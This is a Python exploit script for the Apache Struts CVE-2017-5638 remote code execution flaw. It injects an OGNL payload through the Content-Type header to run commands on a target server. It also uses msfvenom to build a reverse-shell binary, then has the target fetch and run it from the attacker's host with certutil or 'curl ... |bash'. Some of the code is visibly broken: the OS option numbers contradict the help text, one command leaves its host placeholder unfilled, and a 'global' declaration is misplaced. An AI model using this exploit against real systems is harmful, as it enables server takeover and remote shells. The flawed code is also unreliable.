# Author (m4ud)
# Apache Struts-045
# CVE : 2017-5638
import sys
import requests
from optparse import OptionParser
import os


class AS045:
	def __init__(self, options):
		self.target = options.target
		self.directory = options.directory
		self.command = options.command
		self.rport = options.rport
		self.osys = options.osys
		self.lport = options.lport
		self.lhost = options.lhost
		cmd = self.command
		#if self.target is not None and self.lport is not None:

		if(len(sys.argv) < 3):
			print('\n python3 exploit.py -h   ...for help')
			print('\n Usage : exploit.py RHOST RPORT Struts-directory cmd')

		else:
			def wshell(shell):
				f = open( 'shelb', 'w' )
				f.write(shell)
				f.close()
				print("\r\n[+] Initiating Omega Protocol [+]")

			def venom(shell, ext):
				os.system("msfvenom -p "+ shell + "/shell_reverse_tcp LHOST=" + self.lhost+ " LPORT="+ self.lport + " -f "+ ext+ " > shelb")
            
#			proxies='http://127.0.0.1:8080'
#			proxies = {'http' : proxies}
			target = 'http://' + self.target #Vulnerable Server
			print(target)
			port = self.rport
			directory = self.directory # Struts Application directory
			if self.osys == "1":
#				print windows
				shell = "windows"
				ext = "exe"
				venom(shell, ext)
#				wshell(shell)
				os.system('mv shelb shelb.exe')
				global cmd
				cmd = "certutil -urlcache -f -split http://%s/shelb.exe & shelb.exe" % self.lhost
			if self.osys == "2":
#				print linux
				shell = "linux"
				ext = "elf"
				venom(shell, ext)
#				wshell(shell)
#				os.system('mv shelb shelb.elf')
				global cmd
				cmd = "curl http://%s/shelb |bash"

#			cmd = self.command #System Command to be execute

			URL = target + ':' + port + '/' + directory + '/'
#			print(URL)

			payload = "%{(#_='multipart/form-data')."
			payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
			payload += "(#_memberAccess?"
			payload += "(#_memberAccess=#dm):"
			payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
			payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
			payload += "(#ognlUtil.getExcludedPackageNames().clear())."
			payload += "(#ognlUtil.getExcludedClasses().clear())."
			payload += "(#context.setMemberAccess(#dm))))."
			payload += "(#cmd='%s')." % cmd
			payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
			payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
			payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
			payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
			payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
			payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
			payload += "(#ros.flush())}"

			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
#			print(headers)
#			r = requests.get(URL, headers=headers, proxies=proxies)

			r = requests.get(URL, headers=headers)
			print(r.text)



def main():
	parser = OptionParser()
	parser.add_option("-p", "--port", dest="rport", help="RPORT, ")
	parser.add_option("-t", "--target", dest="target", help="Vulnerable Target, ")
	parser.add_option("-d", "--dir", dest="directory",default='struts2-rest-showcase', help="Struts Application directory, ")
	parser.add_option("-c", "--command", dest="command", help="System Command, ")
	parser.add_option("-o", "--os", dest="osys", help="Choose OS: Linux = 1, Windows = 2")
	parser.add_option("-l", "--lhost", dest="lhost", help="LHOST")
	parser.add_option("-P", "--lport", dest="lport", help="LPORT")
	(options, args) = parser.parse_args() 
	exploit = AS045(options) 
if __name__=="__main__": 
	main()

